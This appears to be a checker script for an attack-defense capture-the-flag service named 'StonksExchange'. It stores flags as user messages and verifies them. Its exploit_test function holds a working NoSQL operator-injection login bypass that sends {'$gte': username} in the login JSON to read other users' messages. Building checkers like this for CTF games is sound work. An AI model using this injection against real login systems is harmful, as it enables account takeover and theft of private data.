from typing import Optional
from enochecker3 import (
    Enochecker,
    ChainDB,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from httpx import AsyncClient
import secrets
from logging import LoggerAdapter

checker = Enochecker("StonksExchange", 8199)
app = lambda: checker.app


async def register_user(client: AsyncClient):
    username = secrets.token_hex(6)
    password = secrets.token_hex(8)
    response = await client.post(
        "/register",
        data={
            "username": username,
            "password": password,
        },
    )
    assert_equals(response.status_code, 200, "registration failed")

    return username, password


async def login_user(client: AsyncClient, username: str, password: str) -> None:
    response = await client.post(
        "/login",
        data={
            "username": username,
            "password": password,
        },
    )
    assert_equals(response.status_code, 200, "login failed")


async def send_message(client: AsyncClient, username: str, message: str) -> None:
    response = await client.post(
        "/message",
        data={
            "username": username,
            "message": message,
        },
    )
    assert_equals(response.status_code, 200, "sending message failed")


async def receive_message(client: AsyncClient, message: str) -> None:
    response = await client.get("/messages")
    assert_equals(response.status_code, 200, "receiving message failed")
    assert_in(message, response.text, "flag missing from retrieved messages")


@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    session_a: AsyncClient,
    session_b: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    await register_user(session_a)
    logger.debug("registered user for session_a")
    (username_b, password_b) = await register_user(session_b)
    logger.debug("registered user for session_b")

    await send_message(session_a, username_b, task.flag)

    await db.set("credentials", (username_b, password_b))


@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage, session_b: AsyncClient, db: ChainDB
) -> None:
    try:
        username, password = await db.get("credentials")
    except KeyError:
        raise MumbleException("Missing entries from putflag")

    await login_user(session_b, username, password)
    await receive_message(session_b, task.flag)


@checker.exploit(0)
async def exploit_test(searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    username = "0" * 12 + secrets.token_hex(6)
    password = secrets.token_hex(8)

    r = await client.post(
        "/register",
        data={
            "username": username,
            "password": password,
        },
    )
    assert not r.is_error

    r = await client.post(
        "/login",
        json={
            "username": {
                "$gte": username,
            },
            "password": password,
        },
    )
    assert not r.is_error

    r = await client.get("/messages")
    assert not r.is_error
    if flag := searcher.search_flag(r.text):
        return flag

if __name__ == "__main__":
    checker.run()